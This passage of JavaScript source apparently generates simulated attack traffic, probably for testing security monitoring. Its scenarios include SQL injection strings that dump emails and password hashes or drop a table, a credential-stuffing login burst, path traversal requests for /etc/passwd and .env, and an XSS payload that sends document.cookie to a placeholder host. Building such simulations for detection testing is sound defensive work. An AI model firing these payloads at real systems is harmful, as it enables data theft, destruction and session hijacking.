        { at: 2000, req: r('GET', '/api/search', { query: { q: "1' UNION SELECT email, password_hash FROM users--" } }) },
        ...[2800, 3600, 4400].map((at) => ({ at, req: r('GET', '/api/search', { query: { q: "1; DROP TABLE orders" } }) })),
      ];
    case 'credential-stuffing':
      return Array.from({ length: 8 }, (_, i) => ({
        at: i * 650,
        req: r('POST', '/api/login', { body: { email: `customer${101 + i}@mail.test`, password: '********' }, authFailed: true }),
      }));
    case 'scraper':
      return Array.from({ length: 80 }, (_, i) => ({ at: i * 85, req: r('GET', '/api/products', { query: { page: String(i + 1) } }) }));
    case 'path-traversal':
      return [
        { at: 0, req: r('GET', '/api/files', { query: { name: 'invoice-2041.pdf' } }) },
        { at: 1200, req: r('GET', '/api/files', { query: { name: '../../../../etc/passwd' } }) },
        { at: 2200, req: r('GET', '/api/files', { query: { name: '..%2f..%2f.env' } }) },
        { at: 3200, req: r('GET', '/api/files', { query: { name: 'invoice-2041.pdf' } }) },
      ];
    case 'xss':
      return [
        { at: 0, req: r('GET', '/api/search', { query: { q: '<script>fetch("//x.test/c?"+document.cookie)</script>' } }) },
        { at: 1500, req: r('GET', '/api/search', { query: { q: '<img src=x onerror=alert(1)>' } }) },
      ];
  }
}
